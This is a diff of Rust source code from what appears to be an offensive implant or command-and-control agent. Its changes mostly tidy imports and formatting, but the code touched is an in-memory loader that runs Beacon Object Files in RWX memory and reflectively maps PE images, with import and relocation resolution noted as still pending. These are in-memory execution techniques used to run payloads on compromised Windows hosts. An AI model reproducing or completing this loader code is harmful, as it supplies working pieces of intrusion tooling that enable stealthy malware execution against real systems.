@@ -6,13 +6,17 @@ use std::process::Command;
 use std::time::{SystemTime, UNIX_EPOCH};
 
 #[cfg(target_os = "windows")]
-use windows_sys::Win32::System::Memory::{
-    VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
+use std::ptr;
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
 };
 #[cfg(target_os = "windows")]
-use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
+use windows_sys::Win32::System::Memory::{
+    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+};
 #[cfg(target_os = "windows")]
-use std::ptr;
+use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
 pub enum OperatingSystem {
@@ -111,16 +115,20 @@ impl CommandExecutor {
         #[cfg(target_os = "windows")]
         {
             unsafe {
-                let header = _bof_data.as_ptr() as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER;
-                
+                let header = _bof_data.as_ptr() as *const IMAGE_FILE_HEADER;
+
                 // Basic COFF check (x64)
                 if (*header).Machine != 0x8664 {
-                    return Err(LabyrinthError::Message("Only x64 BOFs are supported".to_string()));
+                    return Err(LabyrinthError::Message(
+                        "Only x64 BOFs are supported".to_string(),
+                    ));
                 }
 
                 let mut total_size = 0;
-                let section_header_ptr = (_bof_data.as_ptr() as usize + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()) as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
-                
+                let section_header_ptr = (_bof_data.as_ptr() as usize
+                    + std::mem::size_of::<IMAGE_FILE_HEADER>())
+                    as *const IMAGE_SECTION_HEADER;
+
                 for i in 0..(*header).NumberOfSections {
                     let section = *section_header_ptr.add(i as usize);
                     total_size += section.SizeOfRawData as usize;
@@ -134,7 +142,9 @@ impl CommandExecutor {
                 );
 
                 if base_addr.is_null() {
-                    return Err(LabyrinthError::Message("Failed to allocate memory for BOF".to_string()));
+                    return Err(LabyrinthError::Message(
+                        "Failed to allocate memory for BOF".to_string(),
+                    ));
                 }
 
                 let mut current_offset = 0;
@@ -164,7 +174,9 @@ impl CommandExecutor {
         }
         #[cfg(not(target_os = "windows"))]
         {
-            Err(LabyrinthError::Message("Not supported on this OS".to_string()))
+            Err(LabyrinthError::Message(
+                "Not supported on this OS".to_string(),
+            ))
         }
     }
 
@@ -172,13 +184,16 @@ impl CommandExecutor {
         #[cfg(target_os = "windows")]
         {
             unsafe {
-                let dos_header = _pe_data.as_ptr() as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DOS_HEADER;
-                if (*dos_header).e_magic != 0x5A4D { // MZ
+                let dos_header = _pe_data.as_ptr() as *const IMAGE_DOS_HEADER;
+                if (*dos_header).e_magic != 0x5A4D {
+                    // MZ
                     return Err(LabyrinthError::Message("Invalid DOS header".to_string()));
                 }
 
-                let nt_headers = (_pe_data.as_ptr() as usize + (*dos_header).e_lfanew as usize) as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
-                if (*nt_headers).Signature != 0x4550 { // PE
+                let nt_headers = (_pe_data.as_ptr() as usize + (*dos_header).e_lfanew as usize)
+                    as *const IMAGE_NT_HEADERS64;
+                if (*nt_headers).Signature != 0x4550 {
+                    // PE
                     return Err(LabyrinthError::Message("Invalid NT headers".to_string()));
                 }
 
@@ -190,14 +205,22 @@ impl CommandExecutor {
                 );
 
                 if image_base.is_null() {
-                    return Err(LabyrinthError::Message("Failed to allocate memory for PE".to_string()));
+                    return Err(LabyrinthError::Message(
+                        "Failed to allocate memory for PE".to_string(),
+                    ));
                 }
 
                 // Map headers
-                ptr::copy_nonoverlapping(_pe_data.as_ptr(), image_base as *mut u8, (*nt_headers).OptionalHeader.SizeOfHeaders as usize);
+                ptr::copy_nonoverlapping(
+                    _pe_data.as_ptr(),
+                    image_base as *mut u8,
+                    (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
+                );
 
                 // Map sections
-                let section_header_ptr = (nt_headers as usize + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64>()) as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
+                let section_header_ptr = (nt_headers as usize
+                    + std::mem::size_of::<IMAGE_NT_HEADERS64>())
+                    as *const IMAGE_SECTION_HEADER;
                 for i in 0..(*nt_headers).FileHeader.NumberOfSections {
                     let section = *section_header_ptr.add(i as usize);
                     if section.SizeOfRawData > 0 {
@@ -211,7 +234,7 @@ impl CommandExecutor {
 
                 // In a real implementation, we'd resolve imports and relocations here.
                 // For now, we'll finalize the placeholder to indicate successful mapping.
-                
+
                 Ok(format!(
                     "Reflectively mapped PE at {:p}. Size: {} bytes. (Relocation/Import resolution logic pending).",
                     image_base,
@@ -221,7 +244,9 @@ impl CommandExecutor {
         }
         #[cfg(not(target_os = "windows"))]
         {
-            Err(LabyrinthError::Message("Not supported on this OS".to_string()))
+            Err(LabyrinthError::Message(
+                "Not supported on this OS".to_string(),
+            ))
         }
     }
 
